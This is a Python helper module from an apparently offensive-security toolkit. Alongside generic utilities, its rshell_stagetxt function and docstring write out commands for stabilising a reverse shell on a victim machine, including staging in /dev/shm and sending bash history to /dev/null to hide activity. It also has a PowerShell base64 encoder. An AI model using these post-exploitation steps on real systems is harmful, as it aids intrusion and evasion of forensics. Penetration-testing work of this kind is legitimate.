#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Various helper functions."""
from typing import Tuple
import random
import string
import shutil
import os
from base64 import b64encode
from v0tools import Config


def splitter(arr):
    """Split a iterable into all length variations

    example: ::
        import json

        test = "abcd"
        output = list(map(list, splitter(test)))
        print(len(output))
        print(json.dumps(output, indent=4, separators=(",", " : ")))

        print(len(list(splitter("abcdefghijkl"))))

    output: ::
        7
        [
            [
                "a",
                "bcd"
            ],
            [
                "a",
                "b",
                "cd"
            ],
            [
                "a",
                "b",
                "c",
                "d"
            ],
            [
                "a",
                "bc",
                "d"
            ],
            [
                "ab",
                "cd"
            ],
            [
                "ab",
                "c",
                "d"
            ],
            [
                "abc",
                "d"
            ]
        ]
        2047

    """
    # chunk a list into every length combination
    for i in range(1, len(arr)):
        start = arr[0:i]
        end = arr[i:]
        yield (start, end)
        for split in splitter(end):
            result = [start]
            result.extend(split)
            yield result


def randport():
    """Get Random TCP port number (above 1024)."""
    return random.randint(1025, 65535)


def randstr(length=6):
    """Get Random string from A-Za-z0-9 of length x."""
    sample = string.ascii_letters + string.digits
    return "".join(random.choice(sample) for _ in range(length))


def term_rows_cols() -> Tuple[int, int]:
    """Return terminal rows / cols."""
    tinfo = shutil.get_terminal_size()
    rows, cols = tinfo.lines, tinfo.columns
    return rows, cols


def rshell_stagetxt():
    """Print Reverse shell staging information to paste into victim reverse shell

    example: ::
        stty rows 16 cols 135
        export TERM=xterm-256color
        mkdir -p /dev/shm/V0_Rando/bin
        cd /dev/shm/V0_Rando
        ln -fs /dev/null .bash_history
        export SHELL=/bin/bash
        export HOME=$(pwd)
        export PATH=$PATH:$(pwd)/bin
        python -c 'import pty; pty.spawn("/bin/bash")' || python3 -c 'import pty; pty.spawn("/bin/bash")'
    """
    term = os.environ.get("TERM", "xterm-256color")
    v0user = Config.V0_USER()
    rows, cols = term_rows_cols()
    return f"""
stty rows {rows} cols {cols}
export TERM={term}
mkdir -p /dev/shm/{v0user}/bin
cd /dev/shm/{v0user}
ln -fs /dev/null .bash_history
export SHELL=/bin/bash
export HOME=$(pwd)
export PATH=$PATH:$(pwd)/bin
python -c 'import pty; pty.spawn("/bin/bash")' || python3 -c 'import pty; pty.spawn("/bin/bash")'
""".strip()


def powershell_base64_encode(txt: str):
    """Encode a powershell compatible b64 string."""
    return b64encode(txt.encode("UTF-16LE ")).decode()
